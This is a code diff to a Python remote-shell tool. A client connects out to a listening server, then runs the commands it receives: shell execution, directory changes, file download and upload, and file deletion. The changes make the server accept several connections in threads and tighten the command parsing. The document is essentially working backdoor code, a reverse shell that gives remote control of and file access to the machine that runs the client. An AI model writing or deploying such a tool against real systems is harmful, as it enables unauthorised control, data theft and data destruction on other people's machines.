@@ -1,11 +1,10 @@
-import socket
 import argparse
-import threading
-import subprocess
-import os
-import sys
 import base64
-import json
+import os
+import socket
+import subprocess
+import sys
+import threading
 
 
 class Server:
@@ -19,11 +18,12 @@ class Server:
 		listener.listen(5)
 		print(f"Listening on {self.host}:{self.port}")
 
-		self.connection, address = listener.accept()
-		print()
-		print(f"Received connection from {address}")
-		# ct = threading.Thread(target=self.handle, args=())
-		# ct.start()
+		while True:
+			self.connection, address = listener.accept()
+			print()
+			print(f"Received connection from {address}")
+			ct = threading.Thread(target=self.handle, args=())
+			ct.start()
 	
 
 	def handle(self):
@@ -88,6 +88,8 @@ class Client:
 	def __init__(self, ip, port):
 		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		self.connection.connect((ip, port))
+		lt = threading.Thread(target=self.run, args=())
+		lt.start()
 
 
 	def exec_command(self, command):
@@ -116,21 +118,27 @@ class Client:
 		while True:
 			command = ""
 			while "\n" not in command:
-				command += self.connection.recv(1024).decode("utf-8")
+				command += self.connection.recv(4096).decode("utf-8")
 			command = command.rstrip()
 
 			try:
 				if command == "exit":
 					self.connection.close()
 					exit()
-				elif command.count("cd") > 0 and len(command) > 3:
-					result = self.move_fs(command)
-				elif command.count("download") > 0:
+				elif command[0:2] == "cd":
+					if len(command) > 3:
+						result = self.move_fs(command)
+					else:
+						raise Exception("Path missing")
+				elif command[0:8] == "download":
 					result = self.read_file(command)
-				elif command.count("upload") > 0:
+				elif command[0:6] == "upload":
 					result = self.write_file(command)
-				elif command.count("rm") > 0:
-					result = self.remove_file(command)
+				elif command[0:2] == "rm":
+					if len(command) > 3:
+						result = self.remove_file(command)
+					else:
+						raise Exception("File name missing")
 				else:
 					result = self.exec_command(command)
 			except Exception as e:
@@ -180,11 +188,9 @@ def main():
 	args = define_args()
 
 	if args.listen:
-		server = Server(args.port)
-		server.handle()
+		Server(args.port)
 	else:
-		client = Client(args.target,args.port)
-		client.run()
+		Client(args.target,args.port)
 
 
 if __name__ == "__main__":
